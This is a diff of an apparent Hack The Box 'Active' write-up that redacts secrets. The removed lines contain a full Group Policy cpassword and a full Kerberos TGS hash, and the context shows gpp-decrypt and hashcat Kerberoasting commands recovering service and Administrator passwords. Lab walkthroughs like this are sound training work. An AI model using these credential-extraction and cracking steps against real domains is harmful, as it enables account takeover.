@@ -257,11 +257,11 @@ getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
 <pre><code class="language-xml">&lt;SNIP&gt;
 name="active.htb\SVC_TGS" i
 &lt;SNIP&gt;
-cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+cpassword="ed&lt;REDACTED&gt;mQ"
 &lt;SNIP&gt;
 </code></pre>
 <p>Decrypting the password using <code>gpp-decrypt</code>, not we have a set of credentials <code>svc_tgs:GP&lt;REDACTED&gt;18</code>.</p>
-<pre><code class="language-bash">└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+<pre><code class="language-bash">└─$ gpp-decrypt ed&lt;REDACTED&gt;mQ
 GP&lt;REDACTED&gt;18
 </code></pre>
 <h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
@@ -286,18 +286,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 <pre><code class="language-bash">└─$ hashcat -a 0 -m 13100 administrator_tgs /usr/share/wordlists/rockyou.txt
 
 &lt;SNIP&gt;
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$418a029631bc4e0678d33eb17599dfd4$541e6e679f8755852260c872d46a038f5ef75a3641852d5f96612d4a56e23940d9421a1
-8865a936efb4dc751c456e15b1257ce2dffda1c5f1a52c9afda31336d57bbd5df836b9831b96ea8006f0ec0660d4f08991d1b600bac8ac30ef05aa2f48889c284cc61f6654535433661e7a0867b2ca6fbe88d980
-8c4d0cf492ec51b9ec9a64dfffd9b3ee4911307e9772a40dbb0471a004eae956cd448f67fde24534ccc5cd8689d91921598736459c22bd9ea4b358c43d22e1deda4dc76ab8ca0c180a7b159f3c1a1e5ef4ab0491
-d601a2436600134b72d6c5a44d00e5197972ce69cfcb89c36a2ce0ee2418eeb12247c3d88cc0d9faea1224e9c4933d9769d9220a4d0bdf708dd00e8d08993a255a64a3f5f005f2f9c65a1d25613cf81e14519fa1
-f8cca36d1e5cf750bb20dcb7eda1ad48bafd9ef4eedc8e41756bf744bfd27b5716938009725713ac47dd89d15d40266f8c5a033b95288f2f47e067d4bb702db6995ec04a6a3c15edec05e2253b06817991181841
-8741db2092bceb0bd47e54dc517d8313c5a7e407c4e7abe8f1ab3978d4812ae1d0b11ad860ccd54236942178bd4db10d784326d5e7f99420f52b86ebfe2ce45f3720443bcfb65f8b321011f6f06cafa3bda33cb3
-2d1c37fba764832997c37ff278d5f4065a3a16f19069e5be0d15905df7b5093a901c1418f18ab02a3e69604e3b307b4d716b51f8a85965c83846180879d9c32013e2432ad2c14c664f9256af24d857f2a5afae84
-2745c37dcf9c27c6f36bf6c7fc47527f304a1ed431823f95ecd7a01f4262e6d59be40f65dee72575c7f70d5e2c5ec83373b82df74a9035fd57aee34135d782bb918707df2d4a5f35e21bbd239803c29081569585
-13d4e791c4dbebcdd8d17cdded734243db14fdb4ebe12cf56533aac2ac12fa5974a59a634bea71fcd46d36af5cd17e44d72a63eb1f9b3f6e90d7ef05964cb9ac5acfe9187a83667b4e82795d29ab2980f1a24955
-8b8a364cdd28771d0198c1b0b7479d6c5368907507a4329d9520b303ca0e95b10b34f52ee0e0e1b56a2899a29a56754ba9f168be202bdd223d247e3aeb8cd1357cc2fa67fef23c7cd6e3f05081110d11f1960e9d
-235c72e39a877514d89ddce536458aa5923428fe73a20799c686a8440cfc3753c2c1c4e0be1179cf7fce9370035347d0b512f5bcd9bdd5625574587fd3420093dcf7f337eeae24968f64434c149d1f0f70e59ba0
-16831802671439375254a09471bbb:Ti&lt;REDACTED&gt;68
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$418a&lt;REDACTED&gt;1bbb:Ti&lt;REDACTED&gt;68
 &lt;SNIP&gt;
 </code></pre>
 <p>We got the password <code>Ti&lt;REDACTED&gt;68</code></p>
